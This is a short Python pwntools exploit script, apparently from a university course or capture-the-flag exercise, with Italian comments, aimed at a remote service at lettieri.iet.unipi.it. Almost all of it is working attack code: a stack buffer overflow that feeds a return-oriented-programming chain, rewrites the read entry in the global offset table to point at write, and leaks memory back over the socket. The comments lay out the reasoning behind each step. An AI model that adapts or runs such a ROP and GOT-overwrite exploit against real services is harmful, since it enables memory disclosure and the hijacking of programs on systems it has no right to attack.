import sys
import struct
from pwn import *

host = "lettieri.iet.unipi.it"
port = 7001


offset_to_rip = 0x20 + 8

gadget1 = 0x0000000000400b0a #: pop r15; ret; 
gadget2 = 0x0000000000400b0b #: pop rdi; ret;
gadget3 = 0x0000000000400b09 #: pop rsi; pop r15; ret;
usefulGadget = 0x00000000004008c6 #: addq %rdi, (%r15); ret

got = 0x0000000000600ef8 # da vmmap
entry_read = 7 # la read è la settima funzione
got_entry_size = 8 # le entry della got sono indirizzi, quindi 8 byte
add_write_address = got + entry_read * got_entry_size # dove voglio andare a fare la add

read_plt = 0x0000000000400730
read = 0x00000000000ea450 # in libc, offset
write = 0x00000000000ea4f0  # in libc, offset
offset_read_write = write - read # 

# scrivere nell'entry della read di got aggiungendo offset
conn = remote(host, port)
buf = b"A" * offset_to_rip
buf += p64(gadget1)
buf += p64(add_write_address)
buf += p64(gadget2)
buf += p64(offset_read_write)
buf += p64(usefulGadget)

# chiamare read@plt che ora punta alla write nella got e farsi mandare il contenuto
# della got
# preparare argomenti per la write 
# write(int fd, const void *buf, size_t count);
buf += p64(gadget2)
buf += p64(0x0)
buf += p64(gadget3)
buf += p64(got - 256)
buf += b"A"*8
buf += p64(read_plt)

# ci sarebbe ora da preparare rdx, ma non lo trovo il gadget
# in edx ci dovrebbe essere 512 dalla precedente read
# trovo il modo di fare sub? no
# allora parto a leggere da più indietro! (vedi riga 41)
conn.send(buf)
print(conn.recv(512))
conn.close()





